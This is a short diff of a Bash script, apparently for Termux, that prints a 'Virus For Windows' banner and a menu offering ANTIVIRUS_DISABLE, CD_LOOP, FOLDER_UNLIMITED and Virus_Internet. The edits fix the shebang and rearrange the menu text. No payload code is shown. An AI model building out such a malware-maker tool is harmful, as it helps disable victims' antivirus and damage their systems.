@@ -1,5 +1,4 @@
-#!/usr/xbin/bash
-#import sys os
+#!/usr/bin/bash
 pkg install figlet -y
 pkg install toilet -y
 pkg install wget -y
@@ -16,16 +15,16 @@ screenfetch -A windows
 echo "<=====================================>"
 sleep 2
 toilet -f graffiti.flf Virus For Windows
-echo "<======================================>
-echo '\033[34;1m'
+echo "'\033[34;1m'"
+echo "<========================================>"
 echo "1.> ANTIVIRUS_DISABLE"
 echo "2.> CD_LOOP"
 echo "3.> FOLDER_UNLIMITED"
 echo "4.> Virus_Internet"
 echo "0.> exit"
-echo '\033[34;1m'
-echo "<======================================>"
-read -p "Choose-#" code
+echo "<========================================>"
+echo "'\033[34;1m'"
+read -p "root@Windows-#" code
 
 if [ $code = 1 ] || [ $code = 1 ]
 then
